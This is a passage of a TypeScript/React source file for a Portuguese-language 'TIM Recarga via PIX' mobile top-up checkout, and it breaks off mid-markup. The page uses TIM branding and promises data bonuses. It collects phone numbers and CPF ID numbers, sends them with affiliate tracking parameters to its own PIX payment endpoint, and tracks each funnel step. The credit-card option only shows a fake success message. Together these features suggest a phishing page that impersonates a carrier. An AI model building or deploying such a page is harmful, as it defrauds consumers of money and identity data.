import { createFileRoute } from "@tanstack/react-router";

export const Route = createFileRoute("/recarga")({
  head: () => ({
    meta: [
      { title: "Recarga TIM via PIX — Recarregue agora" },
      {
        name: "description",
        content:
          "Recarregue seu TIM via PIX. Pagamento instantâneo, bônus de internet e total segurança.",
      },
    ],
  }),
  validateSearch: (search: Record<string, unknown>) => {
    const step = search.step;
    return {
      ...search,
      step: step === "phone" || step === "payment" || step === "pix" ? step : undefined,
    };
  },
  component: RecargaPage,
});

import { motion, AnimatePresence } from "framer-motion";
import { z } from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useState, useEffect, useRef, useMemo } from "react";
import { toast } from "sonner";
import { useSearch, useNavigate } from "@tanstack/react-router";
import timPreXipPromo from "@/assets/tim-pre-xip-promo.png";
import { Copy, Check, ChevronLeft, Loader2, Lock, AlertTriangle } from "lucide-react";
import PixIcon from "@/components/icons/PixIcon";
import { QRCodeSVG } from "qrcode.react";
import { trackEvent } from "@/lib/tracking";

const safeGetItem = (key: string) => {
  try {
    return localStorage.getItem(key);
  } catch {
    return null;
  }
};
const safeSetItem = (key: string, value: string) => {
  try {
    localStorage.setItem(key, value);
  } catch {
    // Storage is optional; checkout continues when the browser blocks it.
  }
};
const safeRemoveItem = (key: string) => {
  try {
    localStorage.removeItem(key);
  } catch {
    // Storage is optional; checkout continues when the browser blocks it.
  }
};

const phoneSchema = z.string().trim().min(10, "Número inválido. Use DDD + número.").max(15);

const cpfSchema = z
  .string()
  .trim()
  .refine((cpf) => {
    const cleanCPF = cpf.replace(/\D/g, "");
    if (cleanCPF.length !== 11) return false;
    if (/^(\d)\1+$/.test(cleanCPF)) return false;

    let sum = 0;
    for (let i = 0; i < 9; i++) sum += parseInt(cleanCPF.charAt(i)) * (10 - i);
    let rev = 11 - (sum % 11);
    if (rev === 10 || rev === 11) rev = 0;
    if (rev !== parseInt(cleanCPF.charAt(9))) return false;

    sum = 0;
    for (let i = 0; i < 10; i++) sum += parseInt(cleanCPF.charAt(i)) * (11 - i);
    rev = 11 - (sum % 11);
    if (rev === 10 || rev === 11) rev = 0;
    if (rev !== parseInt(cleanCPF.charAt(10))) return false;

    return true;
  }, "CPF inválido");

type Step = "phone" | "payment" | "pix";

type PixData = {
  transactionId?: string;
  status?: string;
  createdAt?: string;
  expiresAt?: string;
  invoiceUrl?: string;
  pixCode?: string;
  qrCodeBase64?: string;
  [key: string]: unknown;
};

type PaymentStatus = "PENDING" | "PAID" | "FAILED" | "CANCELLED" | "EXPIRED" | "REFUNDED" | "";

const RECHARGE_VALUES = [20, 24.9, 29.9, 34.9, 39.9, 44.9, 49.9, 69.9, 99.9];
const UTMIFY_TRACKING_KEYS = [
  "src",
  "sck",
  "utm_source",
  "utm_campaign",
  "utm_medium",
  "utm_content",
  "utm_term",
] as const;
const UTMIFY_TRACKING_STORAGE_KEY = "recargaUtmifyTracking";
const BONUS_MAP: Record<number, string> = {
  20: "+3GB de bônus para WhatsApp, Instagram e redes sociais por 30 dias",
  24.9: "+4GB de bônus para WhatsApp, Instagram e Facebook por 30 dias",
  29.9: "+5GB de bônus para redes sociais e navegação por 30 dias",
  34.9: "+6GB de bônus para WhatsApp, Instagram e vídeos por 30 dias",
  39.9: "+10GB de bônus para redes sociais, YouTube e navegação por 30 dias",
  44.9: "+15GB de bônus para usar WhatsApp, Instagram e assistir vídeos por 30 dias",
  49.9: "+20GB de bônus para navegar, redes sociais e vídeos por 30 dias",
  69.9: "+30GB de bônus para redes sociais, vídeos e apps por 30 dias",
  99.9: "+50GB de bônus para usar internet, redes sociais e assistir vídeos por 30 dias",
};
const rechargeValueButtonBaseClass =
  "relative w-[5rem] h-[5rem] sm:w-[5.5rem] sm:h-[5.5rem] rounded-2xl flex flex-col items-center justify-center transition-all mx-auto";

const isRecord = (value: unknown): value is Record<string, unknown> =>
  typeof value === "object" && value !== null;

const getByPath = (source: unknown, path: string[]): unknown => {
  let current: unknown = source;

  for (const segment of path) {
    if (!isRecord(current)) return undefined;
    current = current[segment];
  }

  return current;
};

const asNonEmptyString = (value: unknown): string =>
  typeof value === "string" ? value.trim() : "";

const getUtmifyTrackingParameters = (): Record<string, string | null> => {
  const tracking: Record<string, string | null> = {};
  const search = new URLSearchParams(window.location.search);
  const saved = safeGetItem(UTMIFY_TRACKING_STORAGE_KEY);
  let savedTracking: Record<string, unknown> = {};

  if (saved) {
    try {
      const parsed = JSON.parse(saved) as unknown;
      if (isRecord(parsed)) savedTracking = parsed;
    } catch {
      // Ignore malformed campaign data saved by an older session.
    }
  }

  let foundInUrl = false;
  for (const key of UTMIFY_TRACKING_KEYS) {
    const fromUrl = search.get(key)?.trim() || "";
    const fromStorage = asNonEmptyString(savedTracking[key]);
    tracking[key] = fromUrl || fromStorage || null;
    if (fromUrl) foundInUrl = true;
  }

  if (foundInUrl) safeSetItem(UTMIFY_TRACKING_STORAGE_KEY, JSON.stringify(tracking));
  return tracking;
};

const extractPixFields = (payload: unknown) => {
  const pixCodePaths = [
    ["pixCode"],
    ["pixCopiaECola"],
    ["pix", "pixCode"],
    ["pix", "copiaecola"],
    ["pix", "copyPaste"],
    ["pix", "payload"],
    ["pix", "qrcode"],
    ["qrCode"],
    ["data", "pixCode"],
    ["data", "pix", "copyPaste"],
    ["data", "pix", "qrcode"],
    ["data", "paymentData", "copyPaste"],
    ["data", "paymentData", "qrCode"],
    ["gateway", "pixCode"],
    ["gateway", "pix", "copyPaste"],
    ["gateway", "pix", "qrcode"],
    ["gateway", "data", "paymentData", "copyPaste"],
    ["gateway", "data", "paymentData", "qrCode"],
  ];

  const qrBase64Paths = [
    ["qrCodeBase64"],
    ["qrcodeBase64"],
    ["pix", "qrCodeBase64"],
    ["pix", "qrcodeBase64"],
    ["gateway", "qrCodeBase64"],
    ["gateway", "pix", "qrcodeBase64"],
    ["data", "pix", "qrcodeBase64"],
    ["data", "paymentData", "qrCodeBase64"],
    ["gateway", "data", "paymentData", "qrCodeBase64"],
  ];

  let pixCode = "";
  let qrCodeBase64 = "";

  for (const path of pixCodePaths) {
    const value = asNonEmptyString(getByPath(payload, path));
    if (value) {
      pixCode = value;
      break;
    }
  }

  for (const path of qrBase64Paths) {
    const value = asNonEmptyString(getByPath(payload, path));
    if (value) {
      qrCodeBase64 = value;
      break;
    }
  }

  if (pixCode && qrCodeBase64) return { pixCode, qrCodeBase64 };

  const queue: unknown[] = [payload];

  while (queue.length > 0) {
    const current = queue.shift();
    if (!isRecord(current)) continue;

    for (const [key, rawValue] of Object.entries(current)) {
      if (Array.isArray(rawValue)) {
        queue.push(...rawValue);
        continue;
      }

      if (isRecord(rawValue)) {
        queue.push(rawValue);
        continue;
      }

      const value = asNonEmptyString(rawValue);
      if (!value) continue;

      const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");

      if (
        !pixCode &&
        (normalizedKey.includes("pixcode") ||
          normalizedKey.includes("copiacola") ||
          value.startsWith("000201"))
      ) {
        pixCode = value;
      }

      if (
        !qrCodeBase64 &&
        (normalizedKey.includes("base64") || normalizedKey.includes("qrcode")) &&
        value.length > 100
      ) {
        qrCodeBase64 = value;
      }

      if (pixCode && qrCodeBase64) return { pixCode, qrCodeBase64 };
    }
  }

  return { pixCode, qrCodeBase64 };
};

const extractFunctionErrorMessage = (errorPayload: unknown): string => {
  const candidates = [["message"], ["error"], ["details", "message"], ["details", "error"]];

  for (const path of candidates) {
    const value = asNonEmptyString(getByPath(errorPayload, path));
    if (value) return value;
  }

  return "";
};

const normalizePaymentStatus = (value: string): PaymentStatus => {
  const normalized = value.trim().toUpperCase();
  const accepted: PaymentStatus[] = [
    "PENDING",
    "PAID",
    "FAILED",
    "CANCELLED",
    "EXPIRED",
    "REFUNDED",
    "",
  ];

  return accepted.includes(normalized as PaymentStatus) ? (normalized as PaymentStatus) : "";
};

const getPaymentStatusLabel = (status: PaymentStatus): string => {
  const labels: Record<Exclude<PaymentStatus, "">, string> = {
    PENDING: "Aguardando pagamento",
    PAID: "Pagamento confirmado",
    FAILED: "Pagamento falhou",
    CANCELLED: "Pagamento cancelado",
    EXPIRED: "Pagamento expirado",
    REFUNDED: "Pagamento estornado",
  };

  return status ? labels[status] : "Status indisponivel";
};
const customScrollTo = (targetY: number, duration: number = 1000) => {
  const startY = window.scrollY;
  const change = targetY - startY;
  const startTime = performance.now();

  const easeInOutQuad = (t: number, b: number, c: number, d: number) => {
    t /= d / 2;
    if (t < 1) return (c / 2) * t * t + b;
    t--;
    return (-c / 2) * (t * (t - 2) - 1) + b;
  };

  const animateScroll = (currentTime: number) => {
    const elapsed = currentTime - startTime;
    const val = easeInOutQuad(elapsed, startY, change, duration);
    window.scrollTo(0, val);
    if (elapsed < duration) {
      requestAnimationFrame(animateScroll);
    } else {
      window.scrollTo(0, targetY);
    }
  };

  requestAnimationFrame(animateScroll);
};

function RecargaPage() {
  useEffect(() => {
    trackEvent("page_view", {
      telefone: "",
      valor: null,
      transaction_id: null,
      status: "visitou",
    });
  }, []);

  const [phone, setPhone] = useState("");
  const [error, setError] = useState("");
  const [cpf, setCpf] = useState("");
  const [cpfError, setCpfError] = useState("");

  const search = useSearch({ from: "/recarga" }) as { step?: string };
  const navigate = useNavigate();
  const stepParam = (search.step ?? null) as Step | null;
  const step: Step =
    stepParam && ["phone", "payment", "pix"].includes(stepParam) ? stepParam : "phone";

  const setStep = (newStep: Step, isBack = false) => {
    void navigate({
      to: "/recarga",
      search: (previous) => ({
        ...previous,
        step: newStep === "phone" ? undefined : newStep,
      }),
      replace: isBack,
    });
  };

  const [selectedValue, setSelectedValue] = useState(49.9);
  const [paymentMethod, setPaymentMethod] = useState<"pix" | "credito">("pix");
  const [copied, setCopied] = useState(false);
  const [timeLeft, setTimeLeft] = useState(15 * 60);
  const [loading, setLoading] = useState(false);
  const [checkingStatus, setCheckingStatus] = useState(false);

  const [paymentStatus, setPaymentStatus] = useState<PaymentStatus>("");

  const [pixData, setPixData] = useState<PixData | null>(null);

  const restoreSavedPixData = (): PixData | null => {
    const saved = safeGetItem("recargaOrderData");
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        return {
          transactionId: parsed.txid,
          status: parsed.status,
          createdAt: parsed.createdAt,
          expiresAt: parsed.expiresAt ? new Date(parsed.expiresAt).toISOString() : undefined,
          pixCode: parsed.pixCode,
          qrCodeBase64: parsed.qrCodeImage,
        };
      } catch (e) {
        console.error("Failed to parse recargaOrderData", e);
      }
    }
    return null;
  };

  const timerRef = useRef<NodeJS.Timeout | null>(null);
  const statusPollRef = useRef<NodeJS.Timeout | null>(null);
  const paidNotifiedRef = useRef(false);
  const phoneTrackedRef = useRef(false);
  const cpfTrackedRef = useRef(false);

  useEffect(() => {
    setPhone(safeGetItem("recargaPhone") || "");
    setCpf(safeGetItem("recargaCpf") || "");
    setSelectedValue(Number(safeGetItem("recargaAmount")) || 49.9);

    const savedPixData = restoreSavedPixData();
    if (savedPixData) {
      setPixData(savedPixData);
      setPaymentStatus(normalizePaymentStatus(asNonEmptyString(savedPixData.status)));
    }
  }, []);

  useEffect(() => {
    const telefoneValue = phone.replace(/\D/g, "");
    if (telefoneValue.length >= 10 && !phoneTrackedRef.current) {
      phoneTrackedRef.current = true;
      void trackEvent("preencheu_telefone", { status: "preenchido" });
    } else if (telefoneValue.length < 10) {
      phoneTrackedRef.current = false;
    }
  }, [phone]);

  useEffect(() => {
    const cpfValue = cpf.replace(/\D/g, "");
    if (cpfValue.length === 11 && !cpfTrackedRef.current) {
      cpfTrackedRef.current = true;
      void trackEvent("preencheu_cpf", { status: "preenchido" });
    } else if (cpfValue.length < 11) {
      cpfTrackedRef.current = false;
    }
  }, [cpf]);

  useEffect(() => {
    if (selectedValue) {
      safeSetItem("recargaAmount", String(selectedValue));
    }
  }, [selectedValue]);

  const getPixDataForAmount = async (amount: number): Promise<PixData> => {
    const res = await fetch("/api/public/create-pix-payment", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        amount,
        phone,
        customerDocument: cpf.replace(/\D/g, ""),
        trackingParameters: getUtmifyTrackingParameters(),
      }),
    });
    const data = await res.json();
    if (!res.ok) {
      const fallbackPix = extractPixFields(data);
      if (fallbackPix.pixCode) {
        return { ...(isRecord(data) ? data : {}), ...fallbackPix, status: "PENDING" } as PixData;
      }
      const gatewayMessage =
        extractFunctionErrorMessage(data) || "Erro ao gerar pagamento. Tente novamente.";
      throw new Error(gatewayMessage);
    }

    const resolvedPix = extractPixFields(data);
    if (!resolvedPix.pixCode)
      throw new Error("Pagamento criado, mas o codigo PIX nao foi encontrado.");

    const transactionId =
      asNonEmptyString(getByPath(data, ["transactionId"])) ||
      asNonEmptyString(getByPath(data, ["data", "transactionId"]));
    const status = normalizePaymentStatus(
      asNonEmptyString(getByPath(data, ["status"])) ||
        asNonEmptyString(getByPath(data, ["data", "status"])) ||
        "PENDING",
    );
    const expiresAt =
      asNonEmptyString(getByPath(data, ["expiresAt"])) ||
      asNonEmptyString(getByPath(data, ["data", "paymentData", "expiresAt"]));
    const createdAt =
      asNonEmptyString(getByPath(data, ["createdAt"])) ||
      asNonEmptyString(getByPath(data, ["data", "createdAt"])) ||
      new Date().toISOString();
    const invoiceUrl =
      asNonEmptyString(getByPath(data, ["invoiceUrl"])) ||
      asNonEmptyString(getByPath(data, ["data", "invoiceUrl"]));
    const qrCodeBase64 =
      asNonEmptyString(getByPath(data, ["qrCodeBase64"])) ||
      asNonEmptyString(getByPath(data, ["data", "paymentData", "qrCodeBase64"])) ||
      resolvedPix.qrCodeBase64;

    return {
      ...(isRecord(data) ? data : {}),
      transactionId,
      status: status || "PENDING",
      createdAt,
      expiresAt,
      invoiceUrl,
      pixCode: resolvedPix.pixCode,
      qrCodeBase64,
    };
  };

  const expiresAtSeconds = useMemo(() => {
    const MAX_SECONDS = 15 * 60;
    if (!pixData?.expiresAt) return MAX_SECONDS;
    const expiresTimestamp = new Date(pixData.expiresAt).getTime();
    if (Number.isNaN(expiresTimestamp)) return MAX_SECONDS;
    const diff = Math.floor((expiresTimestamp - Date.now()) / 1000);
    return diff > 0 ? Math.min(diff, MAX_SECONDS) : 0;
  }, [pixData?.expiresAt]);

  useEffect(() => {
    if (step === "payment") {
      // Polling approach to wait for the element to be rendered by AnimatePresence
      const interval = setInterval(() => {
        const bottomBtns = document.getElementById("payment-bottom-buttons");
        if (bottomBtns) {
          clearInterval(interval);
          window.scrollTo(0, 0);
          setTimeout(() => {
            const y =
              bottomBtns.getBoundingClientRect().bottom + window.scrollY - window.innerHeight + 40;
            customScrollTo(Math.max(0, y), 800);
          }, 50); // slight delay to allow layout to settle
        }
      }, 50);
      setTimeout(() => clearInterval(interval), 2000);
    }

    if (step === "phone") {
      const interval = setInterval(() => {
        const formSection = document.getElementById("phone-form-section");
        if (formSection) {
          clearInterval(interval);
          setTimeout(() => {
            const y = formSection.getBoundingClientRect().top + window.scrollY - 80;
            customScrollTo(Math.max(0, y), 800);
          }, 50);
        }
      }, 50);
      setTimeout(() => clearInterval(interval), 2000);
    }

    if (step === "pix") {
      window.scrollTo(0, 0);
      setTimeLeft(expiresAtSeconds);
      timerRef.current = setInterval(() => {
        setTimeLeft((prev) => {
          if (prev <= 1) {
            clearInterval(timerRef.current!);
            timerRef.current = null;
            safeRemoveItem("recargaOrderData");
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    } else if (timerRef.current) {
      clearInterval(timerRef.current);
      timerRef.current = null;
    }

    return () => {
      if (timerRef.current) {
        clearInterval(timerRef.current);
        timerRef.current = null;
      }
    };
  }, [step, expiresAtSeconds]);

  useEffect(() => {
    if (step !== "pix" || !pixData?.transactionId) {
      if (statusPollRef.current) {
        clearInterval(statusPollRef.current);
        statusPollRef.current = null;
      }
      return;
    }

    let cancelled = false;

    const checkStatus = async (silent: boolean) => {
      if (!silent) setCheckingStatus(true);

      try {
        const res = await fetch("/api/public/check-pix-payment-status", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            transactionId: pixData.transactionId,
            amount: selectedValue,
            phone,
            customerDocument: cpf.replace(/\D/g, ""),
            createdAt: pixData.createdAt,
            trackingParameters: getUtmifyTrackingParameters(),
          }),
        });
        const data = await res.json();
        if (!res.ok) return;

        const status = normalizePaymentStatus(asNonEmptyString(getByPath(data, ["status"])));

        if (!cancelled && status) {
          setPaymentStatus(status);
          const savedStr = safeGetItem("recargaOrderData");
          if (savedStr) {
            try {
              const parsed = JSON.parse(savedStr);
              parsed.status = status;
              safeSetItem("recargaOrderData", JSON.stringify(parsed));
            } catch {
              // Ignore an obsolete or malformed saved checkout.
            }
          }
        }

        if (!cancelled && data) {
          const resolved = extractPixFields(data);
          if (resolved.pixCode) {
            setPixData((prev) => {
              if (!prev) return prev;
              if (!prev.pixCode && resolved.pixCode) {
                const savedStr = safeGetItem("recargaOrderData");
                if (savedStr) {
                  try {
                    const parsed = JSON.parse(savedStr);
                    parsed.pixCode = resolved.pixCode;
                    if (resolved.qrCodeBase64) parsed.qrCodeImage = resolved.qrCodeBase64;
                    safeSetItem("recargaOrderData", JSON.stringify(parsed));
                  } catch {
                    // Ignore an obsolete or malformed saved checkout.
                  }
                }
                return {
                  ...prev,
                  pixCode: resolved.pixCode,
                  qrCodeBase64: resolved.qrCodeBase64 || prev.qrCodeBase64,
                };
              }
              return prev;
            });
          }
        }

        if (!cancelled && (status === "PAID" || getByPath(data, ["paid"]) === true)) {
          if (!paidNotifiedRef.current) {
            trackEvent("pagamento_aprovado", {
              telefone: phone,
              valor: selectedValue,
              transaction_id: pixData.transactionId || null,
              status: "pago",
            });
            toast.success("Pagamento confirmado com sucesso.");
            paidNotifiedRef.current = true;
            safeRemoveItem("recargaOrderData");
          }

          if (statusPollRef.current) {
            clearInterval(statusPollRef.current);
            statusPollRef.current = null;
          }
        }
      } catch (statusError) {
        console.error("Status check error:", statusError);
      } finally {
        if (!silent) setCheckingStatus(false);
      }
    };

    void checkStatus(false);
    statusPollRef.current = setInterval(() => {
      void checkStatus(true);
    }, 10000);

    return () => {
      cancelled = true;
      if (statusPollRef.current) {
        clearInterval(statusPollRef.current);
        statusPollRef.current = null;
      }
      setCheckingStatus(false);
    };
  }, [step, pixData?.transactionId, pixData?.createdAt, selectedValue, phone, cpf]);

  const formatTime = (s: number) => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${m.toString().padStart(2, "0")}:${sec.toString().padStart(2, "0")}`;
  };

  const formatPhone = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 11);
    if (digits.length <= 2) return `(${digits}`;
    if (digits.length <= 7) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`;
    return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`;
  };

  const formatCpf = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 11);
    if (digits.length <= 3) return digits;
    if (digits.length <= 6) return `${digits.slice(0, 3)}.${digits.slice(3)}`;
    if (digits.length <= 9) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
    return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
  };

  const isPhoneFormComplete =
    phone.replace(/\D/g, "").length >= 10 && cpf.replace(/\D/g, "").length === 11;

  const handleConfirm = () => {
    const phoneResult = phoneSchema.safeParse(phone);
    const cpfResult = cpfSchema.safeParse(cpf);

    let hasError = false;

    if (!phoneResult.success) {
      setError(phoneResult.error.issues[0].message);
      hasError = true;
    } else {
      setError("");
    }

    if (!cpfResult.success) {
      setCpfError(cpfResult.error.issues[0].message);
      hasError = true;
    } else {
      setCpfError("");
    }

    if (hasError) return;

    safeSetItem("recargaPhone", phone);
    safeSetItem("recargaCpf", cpf);
    setStep("payment");
  };
  const handleRecarregar = async () => {
    trackEvent("click_recarregar", {
      telefone: phone,
      valor: selectedValue,
      transaction_id: pixData?.transactionId || null,
      status: "clicou_recarregar",
    });
    if (paymentMethod === "pix") {
      const success = await generatePix(false);
      if (success) {
        setStep("pix");
      }
    } else {
      toast.success(`Recarga de R$ ${selectedValue} iniciada para ${phone}!`);
    }
  };

  const generateAttemptedForRef = useRef("");

  useEffect(() => {
    if (step !== "pix") {
      setPixData(null);
      safeRemoveItem("recargaOrderData");
      generateAttemptedForRef.current = "";
    }
  }, [step]);

  // PIX gerado no botão Recarregar para chegar instantâneo na próxima tela

  const generatePix = async (shouldCopy = false): Promise<boolean> => {
    setLoading(true);
    try {
      const pixDataResult = await getPixDataForAmount(selectedValue);

      paidNotifiedRef.current = pixDataResult.status === "PAID";
      setPaymentStatus((pixDataResult.status as PaymentStatus) || "PENDING");
      setPixData(pixDataResult);

      trackEvent("gerar_pix", {
        telefone: phone,
        valor: selectedValue,
        transaction_id: pixDataResult.transactionId || null,
        status: "pix_gerado",
      });

      if (pixDataResult.status === "PAID") {
        trackEvent("pagamento_aprovado", {
          telefone: phone,
          valor: selectedValue,
          transaction_id: pixDataResult.transactionId || null,
          status: "pago",
        });
      }

      const expiresAtTimestamp = pixDataResult.expiresAt
        ? new Date(pixDataResult.expiresAt).getTime()
        : Date.now() + 15 * 60 * 1000;
      const orderData = {
        phone,
        amount: selectedValue,
        formattedPhone: phone,
        pixCode: pixDataResult.pixCode,
        qrCodeImage: pixDataResult.qrCodeBase64,
        txid: pixDataResult.transactionId,
        status: pixDataResult.status || "PENDING",
        createdAt: pixDataResult.createdAt,
        expiresAt: expiresAtTimestamp,
      };
      safeSetItem("recargaOrderData", JSON.stringify(orderData));

      if (shouldCopy) {
        try {
          await navigator.clipboard.writeText(pixDataResult.pixCode ?? "");
          setCopied(true);
          setTimeout(() => setCopied(false), 3500);
        } catch (err) {
          toast.success("PIX gerado! Clique em copiar novamente.");
        }
      }
      return true;
    } catch (err) {
      console.error("Payment error:", err);
      toast.error((err as Error).message || "Erro ao gerar PIX.");
      return false;
    } finally {
      setLoading(false);
    }
  };

  const parsedPixFields = extractPixFields(pixData);
  const pixCode = pixData?.pixCode || parsedPixFields.pixCode || "";
  const pixQrCodeImage = pixData?.qrCodeBase64 || parsedPixFields.qrCodeBase64 || "";
  const pixQrCodeSrc = pixQrCodeImage
    ? pixQrCodeImage.startsWith("data:image")
      ? pixQrCodeImage
      : `data:image/png;base64,${pixQrCodeImage}`
    : "";
  const currentStatus = paymentStatus || normalizePaymentStatus(asNonEmptyString(pixData?.status));
  const statusClassName =
    currentStatus === "PAID"
      ? "bg-emerald-100 text-emerald-700"
      : currentStatus === "FAILED" || currentStatus === "CANCELLED" || currentStatus === "EXPIRED"
        ? "bg-red-100 text-red-700"
        : "bg-amber-100 text-amber-700";

  const handleCopy = async () => {
    if (!pixCode) return;

    // Disparar tracking em background
    setTimeout(() => {
      try {
        trackEvent("copiar_pix", {
          telefone: phone,
          valor: selectedValue,
          transaction_id: pixData?.transactionId || null,
          status: "pix_copiado",
        });
      } catch (err) {
        console.error("Tracking error:", err);
      }
    }, 0);

    try {
      navigator.clipboard.writeText(pixCode);
      setCopied(true);
      setTimeout(() => setCopied(false), 3500);
    } catch (e) {
      toast.error("Não foi possível copiar automaticamente.");
    }
  };

  return (
    <main className="pt-20 pb-24 min-h-screen tim-hero">
      <AnimatePresence mode="wait">
        {/* ===== STEP 1: Phone + customer input ===== */}
        {step === "phone" && (
          <motion.div
            key="phone"
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 20 }}
            transition={{ duration: 0.25 }}
            className="section-container pt-10 pb-0"
          >
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 items-start">
              {/* Left - Bonus sidebar */}
              <motion.div
                initial={{ opacity: 0, x: -40 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ duration: 0.6 }}
                className="flex flex-col items-center lg:items-start text-center lg:text-left"
              >
                <h2 className="text-2xl sm:text-3xl font-extrabold text-primary-foreground uppercase leading-tight mb-8">
                  Recarregando
                  <br />
                  aqui, você tem
                  <br />
                  <span className="text-primary-foreground/80">bônus de internet</span>
                </h2>
                <div className="space-y-5 w-full max-w-xs">
                  {[
                    {
                      value: "R$ 20",
                      bonus: "+3GB",
                      label: "+ WhatsApp ilimitado",
                      popular: false,
                      numValue: 20,
                    },
                    {
                      value: "R$ 39,90",
                      bonus: "+5GB",
                      label: "+ WhatsApp + Instagram ilimitado",
                      popular: true,
                      numValue: 39.9,
                    },
                  ].map((plan) => {
                    const isSelected = selectedValue === plan.numValue;
                    return (
                      <div
                        key={plan.value}
                        onClick={() => {
                          setSelectedValue(plan.numValue);
                          setPixData(null);
                          safeRemoveItem("recargaOrderData");
                          generateAttemptedForRef.current = "";
                        }}
                        className="flex items-center gap-4 rounded-2xl border-2 border-primary-foreground/30 px-5 py-4 transition-all cursor-pointer relative overflow-hidden bg-[#F4F5F8] hover:bg-[#EAECEF] shadow-sm"
                      >
                        {plan.popular && (
                          <div className="absolute top-0 right-0 bg-[#FFCC00] text-primary px-2.5 py-0.5 rounded-bl-xl text-[8px] sm:text-[9px] font-black tracking-widest uppercase shadow-sm z-10">
                            Mais Vendido
                          </div>
                        )}
                        <div className="text-xs uppercase font-semibold leading-tight flex-shrink-0 text-primary/70">
                          A partir de
                          <p className="text-2xl font-extrabold leading-none mt-1 text-[#FFCC00] drop-shadow-[0_1px_1px_rgba(0,0,0,0.8)]">
                            {plan.value}
                          </p>
                        </div>
                        <div className="ml-auto text-right flex flex-col items-end justify-center">
                          <p className="text-3xl font-black leading-none text-[#FFCC00] drop-shadow-[0_1px_1px_rgba(0,0,0,0.8)]">
                            {plan.bonus}
                          </p>
                          <p className="text-[10px] font-bold leading-tight mt-1 max-w-[100px] uppercase text-primary/90">
                            {plan.label}
                          </p>
                        </div>
                      </div>
                    );
                  })}
                </div>
                <p className="text-[10px] text-primary-foreground/40 mt-5 max-w-xs leading-tight">
                  Bônus de +3GB em recargas de R$ 20, de +5GB em recargas a partir de R$ 39,90.
                </p>
              </motion.div>

              {/* Center - Form */}
              <motion.div
                id="phone-form-section"
                initial={{ opacity: 0, y: 30 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.6, delay: 0.1 }}
                className="flex flex-col items-center text-center lg:px-2"
              >
                <h1 className="text-3xl sm:text-4xl font-extrabold text-primary-foreground mb-3">
                  <span className="text-tim-red mr-1">≡</span>TIM Recarga
                </h1>
                <p className="text-sm sm:text-base font-medium text-primary-foreground/90 mb-8 max-w-sm mx-auto leading-snug">
                  Preencha seus dados com{" "}
                  <strong className="font-black text-primary-foreground">segurança</strong> 🔒
                  <br />
                  Com a TIM seus dados estão totalmente{" "}
                  <strong className="font-black text-primary-foreground">protegidos</strong>
                </p>
                <div className="w-full max-w-md space-y-4">
                  <div className="space-y-1.5">
                    <label className="block text-left text-sm text-primary-foreground/70 mb-1">
                      Número TIM
                    </label>
                    <Input
                      id="phone"
                      name="phone"
                      type="tel"
                      placeholder="(11) 99999-9999"
                      value={phone}
                      onChange={(e) => {
                        setPhone(formatPhone(e.target.value));
                        setPixData(null);
                        safeRemoveItem("recargaOrderData");
                        generateAttemptedForRef.current = "";
                        if (error) setError("");
                      }}
                      className="h-14 text-base rounded-xl bg-background border-background text-foreground placeholder:text-muted-foreground focus:ring-ring"
                    />
                  </div>
                  {error && (
                    <p className="text-sm text-left" style={{ color: "hsl(0 100% 70%)" }}>
                      {error}
                    </p>
                  )}
                  <div className="space-y-1.5 mt-4">
                    <label className="block text-left text-sm text-primary-foreground/70 mb-1">
                      CPF
                    </label>
                    <Input
                      type="tel"
                      placeholder="000.000.000-00"
                      value={cpf}
                      onChange={(e) => {
                        setCpf(formatCpf(e.target.value));
                        setPixData(null);
                        safeRemoveItem("recargaOrderData");
                        generateAttemptedForRef.current = "";
                        if (cpfError) setCpfError("");
                      }}
                      className="h-14 text-base rounded-xl bg-background border-background text-foreground placeholder:text-muted-foreground focus:ring-ring"
                    />
                  </div>
                  {cpfError && (
                    <p className="text-sm text-left" style={{ color: "hsl(0 100% 70%)" }}>
                      {cpfError}
                    </p>
                  )}
                  <div className="mt-5 flex gap-3">
                    <Button
                      size="lg"
                      className={`w-full h-14 rounded-full text-base font-semibold border-none transition-all duration-300 ${
                        isPhoneFormComplete
                          ? "bg-[#FFCC00] text-primary hover:bg-[#FFD633] hover:shadow-[0_0_20px_rgba(255,204,0,0.6)] shadow-[0_4px_14px_rgba(255,204,0,0.35)] hover:-translate-y-0.5"
                          : "bg-[hsl(47,44%,52%)]/55 text-primary/70"
                      }`}
                      onClick={handleConfirm}
                      disabled={!isPhoneFormComplete}
                    >
                      Recarregar
                    </Button>
                  </div>
                </div>
              </motion.div>

              {/* Right - Promo */}
              <motion.div
                initial={{ opacity: 0, x: 40 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ duration: 0.7, delay: 0.2 }}
                className="flex items-center justify-center lg:justify-end lg:self-end"
              >
                <img
                  src={timPreXipPromo}
                  alt="Promoção TIM Pré XIP 5G"
                  className="block w-full max-w-[320px] lg:max-w-[360px] object-contain drop-shadow-2xl"
                />
              </motion.div>
            </div>
          </motion.div>
        )}

        {/* ===== STEP 2: Payment method + value ===== */}
        {step === "payment" && (
          <motion.div
            key="payment"
            id="payment-step-container"
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 20 }}
            transition={{ duration: 0.25 }}
            className="section-container py-6 sm:py-8"
          >
            {/* Banner top */}
            <div className="mb-6 sm:mb-8 flex items-center justify-center">
              <img
                src={timPreXipPromo}
                alt="Promoção TIM Pré XIP 5G"
                className="block w-full max-w-[360px] rounded-2xl object-contain drop-shadow-2xl"
              />
            </div>

            <h2
